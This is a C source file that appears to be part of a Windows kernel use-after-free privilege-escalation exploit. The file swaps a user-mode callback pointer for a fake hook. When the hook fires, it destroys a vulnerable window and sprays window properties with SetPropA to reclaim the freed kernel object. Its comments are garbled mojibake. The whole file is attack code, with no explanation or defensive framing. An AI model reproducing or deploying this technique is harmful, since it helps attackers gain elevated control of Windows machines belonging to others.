#include "hookedFunc.h"
#include "assist.h"
#include "uaf.h"
#include "kernelLeaks.h"
#include "spray.h"
BOOL hookedFlag = FALSE;
int hookCount = 0;
// ���ù��Ӻ���
typedef VOID(WINAPI * fct_clLoadLib)(VOID *);
fct_clLoadLib _theRalHooedFunc;
ULONG_PTR ptrHookedAddr;

VOID setHookedFunction()
{
	DWORD dwOldProtect;
	// �õ������Ļ���ַ
	
	// ����������Hook������ַ
	ptrHookedAddr = getHookSaveFunctionAddr();
	_theRalHooedFunc = (fct_clLoadLib)*(ULONG_PTR *)ptrHookedAddr;

	//**********************balabala֮��͵õ����滻*******************
	// ����ӳ�����ҳ
	if (!VirtualProtect((LPVOID)ptrHookedAddr, 0x1000, PAGE_READWRITE, &dwOldProtect))
		return ;

	// �滻
	*(ULONG_PTR *)ptrHookedAddr = (ULONG_PTR)fakedHookFunc;	

	if (!VirtualProtect((LPVOID)ptrHookedAddr, 0x1000, dwOldProtect, &dwOldProtect))
		return;
	
}
VOID unHook()
{
	DWORD dwOldProtect;
	if (!VirtualProtect((LPVOID)ptrHookedAddr, 0x1000, PAGE_READWRITE, &dwOldProtect))
		return;

	// �滻
	*(ULONG_PTR *)ptrHookedAddr = (ULONG_PTR)_theRalHooedFunc;

	if (!VirtualProtect((LPVOID)ptrHookedAddr, 0x1000, dwOldProtect, &dwOldProtect))
		return;
}


VOID fakedHookFunc(VOID *)
{
	// ������֮��������...
	CHAR Buf[0x1000];
	memset(Buf, 0, sizeof(Buf));
	if (hookedFlag == TRUE)
	{
		if (hookCount == 1)
		{
			hookedFlag = FALSE;
			PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(hwndVulA, 1);
			//__debugbreak();
			//Sleep(5000);
			DestroyWindow(hwndVulA);
			DestroyWindow(hwndPa);
			PostQuitMessage(0);
			for(int i = 0; i < hwndCount; i++)
				if (sprayWnd_5[i] != NULL)
				{
					SetPropA(sprayWnd_5[i], (LPCSTR)(0x7), (HANDLE)0xBBBBAAAABBBBAAAA);
					SetPropA(sprayWnd_5[i], (LPCSTR)(0x8), (HANDLE)0xBBBBAAAABBBBAAAA);
				}
			//__debugbreak();
			//Sleep(5000);
		}
		hookCount++;
	}
	_theRalHooedFunc(Buf);
}